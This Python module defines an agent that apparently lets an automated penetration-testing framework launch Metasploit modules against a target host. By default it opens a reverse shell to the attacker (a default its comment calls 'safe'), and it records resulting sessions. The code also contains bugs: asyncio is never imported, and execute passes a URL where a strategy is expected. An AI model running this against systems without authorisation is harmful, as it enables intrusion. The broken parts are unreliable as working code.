import re
from core.data_models import AgentData, Strategy
from core.data_models import MetasploitReport, Strategy, AttackPhase, ErrorType
from core.metasploit_client import MetasploitClient
from core.logger import log
from typing import Optional
import time

from core.base_agent import BaseAgent


class MetasploitAgent(BaseAgent):
    # Assuming AttackPhase enum is not available
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.ESCALATION]
    required_tools = ["msfconsole"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.msf_client: Optional[MetasploitClient] = None
        self.report_class = MetasploitReport # Set report class

    async def setup(self):
        """Asynchronous setup method for MetasploitAgent."""
        self.msf_client = await self.context_manager.get_context('msf_client')

    async def run(self, strategy: Strategy, **kwargs) -> MetasploitReport:
        start_time = time.time()
        log.info("Running Metasploit Agent...")

        # Prioritize getting module and options from the strategy context
        module = strategy.context.get("metasploit_module")
        options = strategy.context.get("metasploit_options", {})

        # Fallback to extracting from directive if not in context
        if not module:
            match = re.search(r"Use Metasploit module (\S+)",
                              strategy.directive)
            if match:
                module = match.group(1)
            else:
                end_time = time.time()
                return MetasploitReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    errors=["No Metasploit module specified in strategy context or directive."],
                    error_type=ErrorType.CONFIGURATION,
                    summary="Metasploit module execution failed: No module specified."
                )

        # Ensure common options are set, allowing strategy context to override
        options.setdefault('RHOSTS', await self.context_manager.get_context('target_host'))
        options.setdefault('LHOST', await self.context_manager.get_context('attacker_ip'))
        options.setdefault('LPORT', await self.context_manager.get_context('attacker_port'))
        # A safe default
        options.setdefault('PAYLOAD', "generic/shell_reverse_tcp")

        log.info(
            f"Executing Metasploit module: {module} with options: {options}")

        # Ensure the client is connected before running
        if not self.msf_client or not await self.msf_client.is_connected():
            log.error("Metasploit client is not connected. Cannot run module.")
            end_time = time.time()
            return MetasploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["Metasploit client not connected."],
                error_type=ErrorType.NETWORK,
                summary="Metasploit module execution failed: Client not connected.",
                module_used=module
            )

        success, result_data = await self.msf_client.run_module(module, options)

        if success:
            log.success(f"Metasploit module {module} executed successfully.")
            session_id = result_data.get('session_id')
            end_time = time.time()
            return MetasploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                output=result_data.get('output', ''),
                module_used=module,
                session_id=str(session_id) if session_id is not None else None,
                summary=f"Metasploit module {module} executed successfully."
            )
        else:
            log.error(f"Metasploit module {module} failed.")
            end_time = time.time()
            return MetasploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=[result_data.get('error', 'Unknown error')],
                error_type=ErrorType.LOGIC,
                summary=f"Metasploit module {module} failed.",
                output=result_data.get('error', 'Unknown error'),
                module_used=module
            )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute metasploit agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
